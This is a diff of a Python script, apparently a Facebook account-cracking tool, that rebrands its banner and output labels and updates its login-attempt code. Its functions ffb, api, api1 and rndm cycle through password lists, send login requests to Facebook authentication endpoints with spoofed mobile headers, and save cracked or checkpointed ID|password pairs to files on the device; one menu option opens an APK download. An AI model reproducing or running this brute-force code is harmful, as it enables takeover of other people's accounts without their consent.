@@ -45,20 +45,18 @@ for agent in range(10000):
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)
 logo=("""\033[1;37m
- 
-    #    #    # ######     #    #     # 
-   # #   #   #  #     #   # #   ##   ## 
-  #   #  #  #   #     #  #   #  # # # # 
- #     # ###    ######  #     # #  #  # 
- ####### #  #   #   #   ####### #     # 
- #     # #   #  #    #  #     # #     # 
- #     # #    # #     # #     # #     # 
-----------------------------------------------
- Owner       :              Akram 
- Github      :              Akram765
- Facebook    :              Akram
- Type type   :              Free
- Version     :              1.0
+\033[1;37m        #    #    # ######     #    #     # 
+\033[1;37m       # #   #   #  #     #   # #   ##   ## 
+\033[1;37m      #   #  #  #   #     #  #   #  # # # # 
+\033[1;37m     #     # ###    ######  #     # #  #  # 
+\033[1;37m     ####### #  #   #   #   ####### #     # 
+\033[1;37m     #     # #   #  #    #  #     # #     # 
+\033[1;37m     #     # #    # #     # #     # #     # 
+\033[1;37m------------------------------------------------
+\033[1;37m Owner   :            AKRAM
+\033[1;37m Facebook:            AkraM 3:)
+\033[1;37m Github  :            akram765
+\033[1;37m Version :            3.0
 ----------------------------------------------
  \033[1;37m----------------------------------------------""")
 def linex():
@@ -294,11 +292,11 @@ def menu():
                                 gmail()
                         elif xd in ['6','06']:
                                 wx=('Dsj9JMWoixk4Qsje0Ng3nA')
-                                os.system(f'xdg-open 03230230320/{wx}');menu()
+                                os.system(f'xdg-open https://chat.whatsapp.com/HJVYIPzcalJEkyUwWJ0Ipe/{wx}');menu()
                         elif xd in ['7','07']:
-                                os.system('xdg-open https://www.facebook.com/profile.php?id=100080334790585');menu()
+                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/USMAN_VPN1.0.apk/file');menu()
                         elif xd in ['8','08']:
-                                os.system('xdg-open https://www.facebook.com/profile.php?id=100080334790585/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
+                                os.system('xdg-open https://www.facebook.com/100084680097792/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
                         elif xd in ['0','00']:
                                 exit(' Thanks for use 🥰 ')
                         else:
@@ -446,7 +444,7 @@ def gmail():
                 os.system('python akram.py')
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;37m [AKRAM-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [AKRAM] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -473,8 +471,8 @@ def ffb(ids,names,passlist):
                                 break
                         elif 'checkpoint' in usman:
                                 if 'y' in pcp:
-                                        print('\r\r\x1b[38;5;208m [Akram-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/akram-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;208m [Ali-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/Ali-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -488,7 +486,7 @@ xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT
 def api(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [usman-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [AKRAM] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -523,18 +521,25 @@ def api(ids,names,passlist):
                                         "fb_api_req_friendly_name": "authenticate",
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                 head = {
-                                        'content-type':'application/x-www-form-urlencoded',
-                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
-                                        'x-fb-connection-type':'unknown',
-                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                                        'user-agent':ua_string,
-                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
-                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
-                                        'x-fb-connection-quality':'EXCELLENT',
-                                        'x-fb-friendly-name':'authenticate',
-                                        'accept-encoding':'gzip, deflate',
-                                        'x-fb-http-engine':     'Liger'}
-                                url = 'https://b-api.facebook.com/method/auth.login'
+                                        'authority': 'x.facebook.com',
+                                        'method': 'GET',
+                                        'scheme': 'https',
+                                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                                        'accept-language': 'en-US,en;q=0.9',
+                                        'cache-control': 'max-age=0',
+                                        'sec-ch-prefers-color-scheme': 'light',
+                                        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+                                        'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
+                                        'sec-ch-ua-mobile': '?1',
+                                        'sec-ch-ua-platform': '"Android"',
+                                        'sec-ch-ua-platform-version': '"10.0.0"',
+                                        'sec-fetch-dest': 'document',
+                                        'sec-fetch-mode': 'navigate',
+                                        'sec-fetch-site': 'none',
+                                        'sec-fetch-user': '?1',
+                                        'upgrade-insecure-requests': '1',
+                                        'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+                                url = 'https://x.facebook.com/method/auth.login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
@@ -544,8 +549,8 @@ def api(ids,names,passlist):
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [Ali-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/Ali-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;208m [AKRAM-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/AKRAM-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                 else:
@@ -558,7 +563,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [AKRAM-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [AKRAM] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -593,18 +598,25 @@ def api1(ids,names,passlist):
                                         "fb_api_req_friendly_name": "authenticate",
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                 head = {
-                                        'content-type':'application/x-www-form-urlencoded',
-                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
-                                        'x-fb-connection-type':'unknown',
-                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                                        'user-agent':ua_string,
-                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
-                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
-                                        'x-fb-connection-quality':'EXCELLENT',
-                                        'x-fb-friendly-name':'authenticate',
-                                        'accept-encoding':'gzip, deflate',
-                                        'x-fb-http-engine':     'Liger'}
-                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
+                                        'authority': 'x.facebook.com',
+                                        'method': 'GET',
+                                        'scheme': 'https',
+                                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                                        'accept-language': 'en-US,en;q=0.9',
+                                        'cache-control': 'max-age=0',
+                                        'sec-ch-prefers-color-scheme': 'light',
+                                        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+                                        'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
+                                        'sec-ch-ua-mobile': '?1',
+                                        'sec-ch-ua-platform': '"Android"',
+                                        'sec-ch-ua-platform-version': '"10.0.0"',
+                                        'sec-fetch-dest': 'document',
+                                        'sec-fetch-mode': 'navigate',
+                                        'sec-fetch-site': 'none',
+                                        'sec-fetch-user': '?1',
+                                        'upgrade-insecure-requests': '1',
+                                        'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+                                url = 'https://x.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
@@ -614,12 +626,12 @@ def api1(ids,names,passlist):
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [Ali-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/akram-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;208m [AKRAM-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/AKRAM-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open('/sdcard/Akram-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/AKRAM-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
@@ -631,7 +643,7 @@ def api1(ids,names,passlist):
 def rndm(ids,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [AKRAM-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [AKRAM] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         for pas in passlist:
                                 application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                 application_version_code=str(random.randint(000000000,999999999))
@@ -660,18 +672,25 @@ def rndm(ids,passlist):
                                         "fb_api_req_friendly_name": "authenticate",
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                 head = {
-                                        'content-type':'application/x-www-form-urlencoded',
-                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
-                                        'x-fb-connection-type':'unknown',
-                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                                        'user-agent':ua_string,
-                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
-                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
-                                        'x-fb-connection-quality':'EXCELLENT',
-                                        'x-fb-friendly-name':'authenticate',
-                                        'accept-encoding':'gzip, deflate',
-                                        'x-fb-http-engine':     'Liger'}
-                                url = 'https://b-api.facebook.com/method/auth.login'
+                                        'authority': 'x.facebook.com',
+                                        'method': 'GET',
+                                        'scheme': 'https',
+                                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                                        'accept-language': 'en-US,en;q=0.9',
+                                        'cache-control': 'max-age=0',
+                                        'sec-ch-prefers-color-scheme': 'light',
+                                        'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+                                        'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
+                                        'sec-ch-ua-mobile': '?1',
+                                        'sec-ch-ua-platform': '"Android"',
+                                        'sec-ch-ua-platform-version': '"10.0.0"',
+                                        'sec-fetch-dest': 'document',
+                                        'sec-fetch-mode': 'navigate',
+                                        'sec-fetch-site': 'none',
+                                        'sec-fetch-user': '?1',
+                                        'upgrade-insecure-requests': '1',
+                                        'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+                                url = 'https://x.facebook.com/method/auth.login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
